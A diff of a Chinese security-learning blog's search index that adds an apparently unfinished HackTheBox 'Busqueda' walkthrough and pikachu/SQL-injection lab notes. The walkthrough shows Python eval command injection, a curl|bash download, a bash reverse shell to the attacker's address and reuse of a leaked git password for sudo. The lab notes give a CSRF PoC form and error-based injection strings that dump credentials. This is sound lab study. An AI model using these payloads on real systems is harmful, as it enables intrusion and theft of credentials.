+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)</span><br><span class="line">|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52</span><br><span class="line">|_http-title: Did not follow redirect to http://searcher.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure>
+
+<p>22端口开放，一般最后考虑，如果爆破不出来就放弃。</p>
+<p>火狐直接访问，访问不了</p>
+<p><code>echo &quot;10.10.11.208 searcher.htb &quot; &gt;&gt; /etc/hosts</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604192607683.png"></p>
+<p>选了个google，查找内容为123</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604192819640.png"></p>
+<p>很明显，post。</p>
+<p>抓包试试，加个单引号不显示内容</p>
+<p>sqlmap一下，没有注入点。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604194935260.png"></p>
+<p>点击后，发现如下东西：</p>
+<blockquote>
+<p>Custom Engine</p>
+<p>from searchor import Engine<br>Engine.new(“Colgate”, “<a href="https://www.colgate.com/en-us/search/all?term=">https://www.colgate.com/en-us/search/all?term=</a>“)<br>Engine.Colgate.search(“Hi world!”)<br>‘<a href="https://www.colgate.com/en-us/search/all?term=Hi%20world">https://www.colgate.com/en-us/search/all?term=Hi%20world</a>!”</p>
+<p>Searchor CLI Quick Start</p>
+<p>$ searchor Google “Hello World!” –copy</p>
+</blockquote>
+<p>这是调用引擎库去获取数据吧。</p>
+<p><code>Engine.Colgate.search(&quot;Hi world!&quot;)</code></p>
+<p>wp上说尝试构造<code>eval(complie(“要执行的代码”),“&lt;String&gt;”,“exec”)</code></p>
+<blockquote>
+<p>compile() 是一个 Python 内置函数，用于编译字符串、文件或 AST（Abstract Syntax Trees）对象成为字节码或 AST 对象。它的语法为：</p>
+<p>compile(source, filename, mode, flags&#x3D;0, dont_inherit&#x3D;False, optimize&#x3D;-1)<br>source: 必选项，表示要编译的源代码，可以是字符串、文件或 AST 对象。<br>filename: 可选项，表示编译代码的文件名，如果不是从文件中编译代码，传入 “<string>” 即可。<br>mode: 可选项，表示编译代码类型，可以取值为 “exec”（编译整个代码），“eval”（编译单个表达式）或 “single”（编译单个语句）。<br>flags: 可选项，传入变量或位掩码，用于控制编译器的行为或特性。<br>dont_inherit: 可选项，表示是否继承 sys.flags 和 sys. __ optimizations __ 模块中相关选项的值。<br>optimize: 可选项，表示优化级别，如果设置为 -1，表示使用默认优化级别。<br>compile() 函数编译完成后，将会返回一个 code 对象，这个对象可以传递给 exec() 函数执行，也可以将其作为模块使用。compile() 函数在 Python 中比较常用，常用于动态编译、语法检查和代码执行等场景中。</p>
+</blockquote>
+<p>在bp上这样构造：</p>
+<blockquote>
+<p>query&#x3D;123’<strong>%2b</strong>eval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))<strong>%2b’</strong></p>
+</blockquote>
+<p>+、%20我都试过，不行，为啥非要2b,2f也可以，不懂</p>
+<p>效果是这样的，</p>
+<blockquote>
+<p>searchor Google <strong>‘</strong>123’%2beval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))%2b’<strong>’</strong>–copy</p>
+</blockquote>
+<p>相当于执行了参数为:</p>
+<p><strong>‘</strong>123’ </p>
+<p>eval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))</p>
+<p>和&#39;‘</p>
+<p>repeat结果里是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;app.py%0Atemplates&quot;&gt;app.py</span><br><span class="line">templates&lt;/a&gt;. If not, click the link.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>那其实ls可以改为 cat app.py，出现一串代码</p>
+<p>shift+ctrl+u后</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, render_template, request, redirect</span><br><span class="line">from searchor import Engine</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/&amp;#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&amp;#x27;&amp;#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/search&amp;#x27;, methods=[&amp;#x27;POST&amp;#x27;])</span><br><span class="line">def search():</span><br><span class="line">    try:</span><br><span class="line">        engine = request.form.get(&amp;#x27;engine&amp;#x27;)</span><br><span class="line">        query = request.form.get(&amp;#x27;query&amp;#x27;)</span><br><span class="line">        auto_redirect = request.form.get(&amp;#x27;auto_redirect&amp;#x27;)</span><br><span class="line">        </span><br><span class="line">        if engine in Engine.__members__.keys():</span><br><span class="line">            arg_list = [&amp;#x27;searchor&amp;#x27;, &amp;#x27;search&amp;#x27;, engine, query]</span><br><span class="line">            r = subprocess.run(arg_list, capture_output=True)</span><br><span class="line">            url = r.stdout.strip().decode()</span><br><span class="line">            if auto_redirect is not None:</span><br><span class="line">                return redirect(url, code=302)</span><br><span class="line">            else:</span><br><span class="line">                return url</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&quot;Invalid engine!&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&quot;Something went wrong!&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &amp;#x27;__main__&amp;#x27;:</span><br><span class="line">    app.run(debug=False)</span><br></pre></td></tr></table></figure>
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><h4 id="1-shell文件准备"><a href="#1-shell文件准备" class="headerlink" title="1.shell文件准备"></a>1.shell文件准备</h4><p>写一个shell文件</p>
+<p>内容为：<code>bash -i &gt;&amp; /dev/tcp/10.10.14.89/2333 0&gt;&amp;1</code></p>
+<p>这个地址是与htp进行vpn连接的那个地址吧,tun0。</p>
+<p>具体步骤也就是vim shell后，再chmod 777 shell.</p>
+<h4 id="2-监听服务器建立"><a href="#2-监听服务器建立" class="headerlink" title="2.监听服务器建立"></a>2.监听服务器建立</h4><p><code>python3 -m http.server 80</code> 通常用于在本地开发或测试时快速提供 Web 内容。</p>
+<h4 id="3-nc反弹shell"><a href="#3-nc反弹shell" class="headerlink" title="3.nc反弹shell"></a>3.nc反弹shell</h4><p><code>nc -lvnp 2333</code></p>
+<h4 id="4-发包"><a href="#4-发包" class="headerlink" title="4.发包"></a>4.发包</h4><p>包的数据写为</p>
+<p><code>query=http%3a//127.0.0.1/debug&#39;%2beval(compile(&#39;for+x+in+range(1)%3a\n+import+os\n+os.system(&quot;curl+http%3a//10.10.14.89/shell|bash&quot;)&#39;,&#39;a&#39;,&#39;single&#39;))%2b&#39;</code></p>
+<p>(不明觉厉o(￣▽￣)ｄ )</p>
+<p>。。。然后捏，我没监听到东西。</p>
+<p>好吧，<strong>是因为kali有防火墙</strong></p>
+<p><code>sudo systemctl stop ufw</code></p>
+<p><code>sudo systemctl disable ufw</code></p>
+<p>将防火墙禁用，重新发包即可。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604214533285.png"></p>
+<p>然后在nc窗口下</p>
+<p>输入命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">connect to [10.10.14.89] from (UNKNOWN) [10.10.11.208] 56914</span><br><span class="line">bash: cannot set terminal process group (1648): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">svc@busqueda:/var/www/app$ pwd </span><br><span class="line">pwd</span><br><span class="line">/var/www/app</span><br><span class="line">svc@busqueda:/var/www/app$ whoami</span><br><span class="line">whoami</span><br><span class="line">svc</span><br><span class="line">svc@busqueda:/var/www/app$ ls</span><br><span class="line">ls</span><br><span class="line">app.py</span><br><span class="line">templates</span><br><span class="line">svc@busqueda:/var/www/app$ cd /home</span><br><span class="line">cd /home</span><br><span class="line">svc@busqueda:/home$ ls</span><br><span class="line">ls</span><br><span class="line">svc</span><br><span class="line">svc@busqueda:/home$ cd svc</span><br><span class="line">cd svc</span><br><span class="line">svc@busqueda:~$ ls </span><br><span class="line">ls</span><br><span class="line">snap</span><br><span class="line">user.txt</span><br><span class="line">svc@busqueda:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">40941e3cddd105f881ea90e716a3d6a2</span><br><span class="line"></span><br><span class="line">cat etc/hosts</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 busqueda searcher.htb gitea.searcher.htb</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>(内网信息收集部分，参考大佬的习惯是先看sudo -l，再看是否存在未知域名，然后再看web文件夹)<br>访问下未知域名gitea.searcher.htb，<strong>反正我不知道怎么访问</strong>。</p>
+<p>密码一般在etc&#x2F;passwd和etc&#x2F;shadow中，后者的密码一般是哈希值。</p>
+<p>在passwd中找有bash权限的用户，已知有svc，且确定下一个提权的是root</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/$ cat etc/passwd|grep /bin/bash</span><br><span class="line">cat etc/passwd|grep /bin/bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">svc:x:1000:1000:svc:/home/svc:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>重新找到svc文件夹，这次要记得查看<strong>所有</strong>文件，注意隐藏文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:~$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 60</span><br><span class="line">drwxr-x--- 6 svc  svc  4096 Jun  4 12:57 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Dec 22 18:56 ..</span><br><span class="line">lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout</span><br><span class="line">-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc</span><br><span class="line">drwx------ 2 svc  svc  4096 Feb 28 11:37 .cache</span><br><span class="line">-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig</span><br><span class="line">drwx------ 3 svc  svc  4096 Jun  4 10:26 .gnupg</span><br><span class="line">drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local</span><br><span class="line">lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile</span><br><span class="line">lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -&gt; /dev/null</span><br><span class="line">drwx------ 3 svc  svc  4096 Jun  4 04:06 snap</span><br><span class="line">-rw-r----- 1 root svc    33 Jun  4 03:26 user.txt</span><br><span class="line">-rw------- 1 svc  svc  9573 Jun  4 11:29 .viminfo</span><br><span class="line">-rw------- 1 svc  svc    54 Jun  4 07:23 .Xauthority</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>-l长格式信息,-a 所有</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:~$ cat .gitconfig</span><br><span class="line">cat .gitconfig</span><br><span class="line">[user]</span><br><span class="line">        email = cody@searcher.htb</span><br><span class="line">        name = cody</span><br><span class="line">[core]</span><br><span class="line">        hooksPath = no-hooks</span><br></pre></td></tr></table></figure>
+
+<p>注意到，一开始监听进来时，有&#x2F;var&#x2F;www&#x2F;app，查看下隐藏文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/home$  ..</span><br><span class="line">cd ..</span><br><span class="line">svc@busqueda:/$ cd ..</span><br><span class="line">cd ..</span><br><span class="line">svc@busqueda:/$ cd /var/www/app</span><br><span class="line">cd /var/www/app</span><br><span class="line">svc@busqueda:/var/www/app$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .</span><br><span class="line">drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py</span><br><span class="line">drwxr-xr-x 8 www-data www-data 4096 Jun  4 03:26 .git</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates</span><br><span class="line">svc@busqueda:/var/www/app$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/var/www/app$ cd .git</span><br><span class="line">cd .git</span><br><span class="line">svc@busqueda:/var/www/app/.git$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 52</span><br><span class="line">drwxr-xr-x 8 www-data www-data 4096 Jun  4 03:26 .</span><br><span class="line">drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches</span><br><span class="line">-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG</span><br><span class="line">-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config</span><br><span class="line">-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description</span><br><span class="line">-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks</span><br><span class="line">-rw-r--r-- 1 root     root      259 Apr  3 15:09 index</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs</span><br><span class="line">drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects</span><br><span class="line">drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>看下config和logs</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">svc@busqueda:/var/www/app/.git$ cat config</span><br><span class="line">cat config</span><br><span class="line">[core]</span><br><span class="line">        repositoryformatversion = 0</span><br><span class="line">        filemode = true</span><br><span class="line">        bare = false</span><br><span class="line">        logallrefupdates = true</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</span><br><span class="line">        fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch &quot;main&quot;]</span><br><span class="line">        remote = origin</span><br><span class="line">        merge = refs/heads/main</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Apr  3 14:33 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr  3 14:33 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  163 Apr  3 14:33 main</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ cd main</span><br><span class="line">cd main</span><br><span class="line">bash: cd: main: Not a directory</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Apr  3 14:33 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr  3 14:33 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  163 Apr  3 14:33 main</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ cat main</span><br><span class="line">cat main</span><br><span class="line">0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator &lt;administrator@gitea.searcher.htb&gt; 1671970461 +0000  update by push</span><br><span class="line">这里大佬已经试用过了，哈希值破不开，转看config</span><br></pre></td></tr></table></figure>
+
+<p>哎，上述内容在大佬博客里引入了linpeas工具，应该是可以帮助自动查找文件的。</p>
+<p>关注下这串代码：</p>
+<p><code>http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</code></p>
+<p>尝试下cody后的东西作为密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:~$ echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">[sudo] password for svc: Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>jh1usoih2bkjaspwe92确实是密码。</p>
+<p>待续。。。。。。。。。。。。。。。。。。</p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+        <tag>渗透测试</tag>
+        <tag>kali</tag>
       </tags>
   </entry>
   <entry>
@@ -535,7 +740,7 @@ return $outText;#新值
 <p>性别:boy</p>
 <p>手机:15988767673</p>
 <p>住址:nba lakes</p>
-<p>邮箱:<a href="mailto:&#107;&#111;&#98;&#101;&#x40;&#x70;&#105;&#107;&#x61;&#x63;&#x68;&#x75;&#x2e;&#x63;&#111;&#x6d;">&#107;&#111;&#98;&#101;&#x40;&#x70;&#105;&#107;&#x61;&#x63;&#x68;&#x75;&#x2e;&#x63;&#111;&#x6d;</a></p>
+<p>邮箱:<a href="mailto:&#x6b;&#x6f;&#98;&#101;&#x40;&#x70;&#x69;&#x6b;&#97;&#99;&#104;&#x75;&#46;&#x63;&#x6f;&#109;">&#x6b;&#x6f;&#98;&#101;&#x40;&#x70;&#x69;&#x6b;&#97;&#99;&#104;&#x75;&#46;&#x63;&#x6f;&#109;</a></p>
 </blockquote>
 <p>通过bp抓包，右键工具菜单，生成csrf poc，复制写好的表单html文件，放到同文件夹下(csrfpost\)，记为test.html。</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:81/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;15988767673&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;nba<span class="symbol">&amp;#32;</span>lakes&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;kobe<span class="symbol">&amp;#64;</span>pikachu<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -610,7 +815,8 @@ return $outText;#新值
 <h3 id="演示："><a href="#演示：" class="headerlink" title="演示："></a>演示：</h3><p>源代码如下：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>很明显，要求输入一个序列化后的值，后台代码会反序列化。</p>
+<p>该代码逻辑为，你的<strong>输入</strong>需要是一个<strong>序列化的结果</strong>；</p>
+<p>代码尝试将反序列化后的对象<strong>赋值</strong>给变量 <code>$unser</code>。如果<strong>反序列化成功</strong>，即 <code>$s</code> 是一个有效的序列化字符串并可以还原为对象，那么变量 <code>$unser</code> 将不为 <code>false</code>，条件 <code>if(!@$unser = unserialize($s))</code> 将为假，执行else中的语句，可以用xss啊之类的有害语句。</p>
 <p>写个代码</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class S&#123;</span><br><span class="line">        public $test=&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $s=new S(); //创建一个对象</span><br><span class="line">    echo serialize($s); //把这个对象进行序列化</span><br><span class="line">echo &quot;123&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
@@ -620,15 +826,18 @@ return $outText;#新值
 <p>也可以执行其他攻击，如	文件包含、命令执行等。</p>
 <h3 id="防御方法："><a href="#防御方法：" class="headerlink" title="防御方法："></a><strong>防御方法：</strong></h3><p>严格控制用户输入</p>
 <p>对传入的反序列化参数进行严格过滤</p>
+<h2 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h2><p>以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</p>
+<p>本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。</p>
 ]]></content>
       <categories>
         <category>web漏洞</category>
         <category>pikachu</category>
       </categories>
       <tags>
-        <tag>xss</tag>
-        <tag>csrf/ssrf</tag>
         <tag>php反序列化</tag>
+        <tag>xss</tag>
+        <tag>xxe</tag>
+        <tag>csrf/ssrf</tag>
       </tags>
   </entry>
   <entry>
@@ -716,6 +925,55 @@ return $outText;#新值
       </tags>
   </entry>
   <entry>
+    <title>sql注入之报错注入</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
+<p><strong>extravtvalue()</strong></p>
+<p>floor()、rand()…主键重复方式，暂时不展开</p>
+<h2 id="报错注入思想"><a href="#报错注入思想" class="headerlink" title="报错注入思想"></a>报错注入思想</h2><p>语法格式：updatexml(XML_document,Xpath_string,new_value)</p>
+<blockquote>
+<p>XML_document:是字符串String格式，为XML文档对象名称</p>
+<p>Xpath_string:Xpath格式的字符串</p>
+<p>new_value:string格式，替换查找到的符合条件的数据</p>
+</blockquote>
+<p>如果人为构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数<strong>（即出现了符号’~’或’^’,’!’等）</strong>，mysql就会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询当前数据库的用户信息以及数据库版本信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+</span><br><span class="line">获取当前数据库下数据表信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+</span><br><span class="line">获取users表名的列名信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+</span><br><span class="line">获取users数据表下username、password两列名的用户字段信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>语法格式：extractvalue()函数语法:extractvalue(XML_document,XPath_string)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前是数据库名称及使用mysql数据库的版本信息：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+</span><br><span class="line">获取当前位置所用数据库的位置：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+</span><br><span class="line">获取表名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line">获取users表的列名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+</span><br><span class="line">获取对应的列名的信息(username/password):</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>报错注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Web源码拓展</title>
+    <url>/2023/05/20/Web%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/</url>
+    <content><![CDATA[<h1 id="Web源码"><a href="#Web源码" class="headerlink" title="Web源码"></a>Web源码</h1><h2 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1.目录结构"></a>1.目录结构</h2><h2 id="2-脚本类型"><a href="#2-脚本类型" class="headerlink" title="2.脚本类型"></a>2.脚本类型</h2><p>ASP&#x2F;PHP&#x2F;ASPX&#x2F;JSP&#x2F;JAVAWEB&#x2F;python</p>
+<h2 id="3-应用分类"><a href="#3-应用分类" class="headerlink" title="3.应用分类"></a>3.应用分类</h2><p>门户-综合类漏洞</p>
+<p>电商-业务逻辑突出</p>
+<p>论坛-xss逻辑突出</p>
